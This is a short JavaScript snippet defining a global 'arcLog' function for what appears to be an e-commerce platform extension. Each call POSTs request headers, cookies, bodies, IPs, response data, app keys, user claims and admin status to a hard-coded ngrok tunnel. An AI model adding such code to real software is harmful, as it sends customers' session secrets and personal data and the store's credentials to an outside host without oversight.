global.arcLog = (context, functionId, lookupKey, message) => {
  require('needle').post('https://4c9c-38-140-119-42.ngrok.io', {
    timestamp: (new Date()).toISOString(),
    correlationId: context.apiContext.correlationId,
    functionId: functionId,
    lookupKey: lookupKey,
    message: typeof message == 'string' ? message : JSON.stringify(message),
    req_params: JSON.stringify(context?.request?.params),
    req_headers: JSON.stringify(context?.request?.headers),
    req_method: JSON.stringify(context?.request?.method),
    req_url: JSON.stringify(context?.request?.url),
    req_path: JSON.stringify(context?.request?.path),
    req_cookies: JSON.stringify(context?.request?.cookies),
    req_query: JSON.stringify(context?.request?.query),
    req_href: JSON.stringify(context?.request?.href),
    req_secure: JSON.stringify(context?.request?.secure),
    req_ip: JSON.stringify(context?.request?.ip),
    req_ips: JSON.stringify(context?.request?.ips),
    req_body: JSON.stringify(context?.request?.body),
    res_header: JSON.stringify(context?.response?.header),
    res_viewData: JSON.stringify(context?.response?.viewData),
    res_viewName: JSON.stringify(context?.response?.viewName),
    res_body: JSON.stringify(context?.response?.body),
    res_status: JSON.stringify(context?.response?.status),
    res_message: JSON.stringify(context?.response?.message),
    res_length: JSON.stringify(context?.response?.length),
    res_type: JSON.stringify(context?.response?.type),
    baseUrl: context?.apiContext?.baseUrl,
    basePciUrl: context?.apiContext?.basePciUrl,
    tenantPod: context?.apiContext?.tenantPod,
    appClaims: context?.apiContext?.appClaims,
    appKey: context?.apiContext?.appKey,
    tenantId: context?.apiContext?.tenantId,
    siteId: context?.apiContext?.siteId,
    masterCatalogId: context?.apiContext?.masterCatalogId,
    catalogId: context?.apiContext?.catalogId,
    currencyCode: context?.apiContext?.currencyCode,
    previewDate: context?.apiContext?.previewDate,
    localeCode: context?.apiContext?.localeCode,
    isAuthorizedAsAdmin: context?.apiContext?.isAuthorizedAsAdmin,
    userClaims: JSON.stringify(context.apiContext.userClaims),
    contextKeys: JSON.stringify(Object.keys(context || {})),
    contextGet: JSON.stringify(Object.keys(context.get || {})),
    contextExec: JSON.stringify(Object.keys(context.exec || {})),
  }, { json: true });
}
